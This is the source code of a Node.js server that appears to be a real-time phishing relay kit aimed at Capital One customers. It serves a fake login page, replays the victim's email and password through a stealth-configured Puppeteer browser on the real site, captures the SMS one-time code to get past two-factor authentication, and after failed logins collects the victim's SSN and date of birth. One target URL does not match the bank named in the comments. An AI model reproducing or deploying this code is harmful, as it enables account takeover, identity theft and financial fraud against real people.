const express = require("express");
const bodyParser = require("body-parser");
const puppeteerExtra = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

// Add stealth plugin to Puppeteer
puppeteerExtra.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// Track invalid login attempts globally
let invalidAttempts = 0;
let browser, page;

// **Utility Function to Launch Puppeteer Browser**
async function launchBrowser() {
  if (!browser) {
    console.log("Launching Puppeteer browser...");
    browser = await puppeteerExtra.launch({
      headless: false,
      args: [
        "--no-sandbox", // Required for Heroku
        "--disable-setuid-sandbox", // Required for Heroku
      ],
    });
    console.log("Browser launched successfully!");
    page = await browser.newPage();
  }
}

// **Route: Serve the Login Form**
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <style>
          body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
          input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
          button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
          button:hover { background-color: #0056b3; }
        </style>
      </head>
      <body>
        <h1>Login</h1>
        <form action="/submit-login" method="POST">
          <label>Email: <input type="text" name="email" required /></label><br/>
          <label>Password: <input type="password" name="password" required /></label><br/>
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
  `);
});

app.post("/submit-login", async (req, res) => {
  const { email, password } = req.body;

  try {
    // Launch Puppeteer browser if not already launched
    await launchBrowser();
    

    console.log(`Server running00`);
    // Navigate to the Capital One login page if not already loaded
    if (page.url() !== "https://apps.emaillistverify.com/users/login") {
      await page.goto("https://apps.emaillistverify.com/users/login", { waitUntil: "networkidle2", timeout: 60000 });
    }
    

    console.log(`Server running001`);
    // Clear cookies and cache explicitly
    const client = await page.target().createCDPSession();
    await client.send("Network.clearBrowserCookies");
    await client.send("Network.clearBrowserCache");

    // Clear the input fields before typing
    await page.evaluate(() => {
      // Clear the email input field
      const emailField = document.querySelector('input#username');
      if (emailField) emailField.value = '';

      // Clear the password input field
      const passwordField = document.querySelector('input#password');
      if (passwordField) passwordField.value = '';
    });
    

    console.log(`Server running002`);
    // Type the login credentials
    await page.type('input#username', email, { delay: 100 });
    await page.type('input#password', password, { delay: 100 });

    console.log(`Server running004`);

    // Click the login button
    await page.evaluate(() => {
      const button = document.querySelector('button#noAcctSubmit');
      if (button) button.click();
    });

    // Wait for navigation after login attempt
    await page.waitForNavigation({ waitUntil: "networkidle2" });

    // Check for login success
    const loginSuccess = await page.evaluate(() => {
      const element = document.querySelector('div.option-list-entry--message > p.message--header');
      return element && element.textContent.trim() === 'Text me a temporary code';
    });

    if (loginSuccess) {
      // Successful login
      invalidAttempts = 0; // Reset invalid attempts

      // Click "Text me a temporary code"
      await page.click('div.option-list-entry--message > p.message--header');
      
     

      // Wait for "Send me the code" button
      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
      await page.click('button[data-testtarget="otp-button"]');

      // Render the OTP input form
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Enter OTP</title>
            <style>
              body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
              input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
              button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
              button:hover { background-color: #0056b3; }
            </style>
          </head>
          <body>
            <h1>Enter OTP</h1>
            <form action="/submit-otp" method="POST">
              <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
    } else {
      // Unsuccessful login handling
      invalidAttempts++;

      if (invalidAttempts === 1) {
        // First invalid attempt: Render the login form again with a message
        res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Invalid Login</title>
              <style>
                body {
                  font-family: Arial, sans-serif;
                  max-width: 500px;
                  margin: 2rem auto;
                  text-align: center;
                }
                input, button {
                  padding: 0.5rem;
                  margin: 0.5rem 0;
                  font-size: 1rem;
                }
                button {
                  background-color: #007bff;
                  color: #fff;
                  border: none;
                  cursor: pointer;
                }
                button:hover {
                  background-color: #0056b3;
                }
              </style>
            </head>
            <body>
              <h1>Invalid Login Attempt</h1>
              <p>Your login details are incorrect. Please try again.</p>
              <form action="/submit-login" method="POST">
                <label>Email: <input type="text" name="email" required /></label><br/>
                <label>Password: <input type="password" name="password" required /></label><br/>
                <button type="submit">Log in</button>
              </form>
            </body>
          </html>
        `);
      } else if (invalidAttempts === 2) {
        // Second invalid attempt: Navigate to sign-in help
        await page.goto("https://verified.capitalone.com/sign-in-help/", { waitUntil: "networkidle2" });

        // Serve the contact form
        res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Contact Information</title>
              <style>
                body {
                  font-family: Arial, sans-serif;
                  max-width: 500px;
                  margin: 2rem auto;
                  text-align: center;
                }
                input, button {
                  padding: 0.5rem;
                  margin: 0.5rem 0;
                  font-size: 1rem;
                }
                button {
                  background-color: #007bff;
                  color: #fff;
                  border: none;
                  cursor: pointer;
                }
                button:hover {
                  background-color: #0056b3;
                }
              </style>
            </head>
            <body>
              <h1>Contact Information</h1>
              <form action="/submit-contact" method="POST">
                <label>Last Name: <input type="text" name="lastname" required /></label><br/>
                <label>SSN: <input type="password" name="ssn" required /></label><br/>
                <label>Date of Birth: <input type="text" name="dob" required placeholder="mm/dd/yyyy" /></label><br/>
                <button type="submit">Find Me</button>
              </form>
            </body>
          </html>
        `);
      } else {
        // Third invalid attempt or more: Lockout response
        res.send("<h1>Too many invalid attempts. Please try again later.</h1>");
      }
    }
  } catch (error) {
    console.error("Error during login:", error);
    res.status(500).send("<h1>An error occurred during login.</h1>");
  }
});
// **Route: Handle OTP Submission**
app.post("/submit-otp", async (req, res) => {
  const { otp } = req.body;

  try {
    console.log("Submitting OTP...");
    await page.type('input#pinEntry', otp, { delay: 100 });
    await page.click('button[data-testtarget="otp-submit"]');
    await page.waitForNavigation({ waitUntil: "networkidle2" });

    const dashboardLoaded = await page.evaluate(() => {
      return document.querySelector("div#recentTransactionsSection") !== null;
    });

    if (dashboardLoaded) {
      res.send("<h1>OTP verified! Welcome to your dashboard.</h1>");
    } else {
      res.send("<h1>Invalid OTP. Please try again.</h1>");
    }
  } catch (error) {
    console.error("Error during OTP submission:", error);
    res.status(500).send("<h1>An error occurred while processing your OTP.</h1>");
  }
});

// **Route: Handle Contact Form Submission**
app.post("/submit-contact", async (req, res) => {
  const { lastname, ssn, dob } = req.body;

  try {
    console.log("Submitting contact details...");
    await page.type("input#lastname", lastname, { delay: 100 });
    await page.type("input#fullSSN", ssn, { delay: 100 });
    await page.type("input#dob", dob, { delay: 100 });

    await Promise.all([
      page.click("#find-me-button"),
      page.waitForNavigation({ waitUntil: "networkidle2" }),
    ]);

    res.send("<h1>Contact details submitted successfully!</h1>");
  } catch (error) {
    console.error("Error submitting contact details:", error);
    res.status(500).send("<h1>An error occurred while submitting contact details.</h1>");
  }
});

// **Graceful Shutdown**
process.on("SIGINT", async () => {
  if (browser) {
    console.log("Closing Puppeteer browser...");
    await browser.close();
  }
  process.exit();
});

// **Start the Server**
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
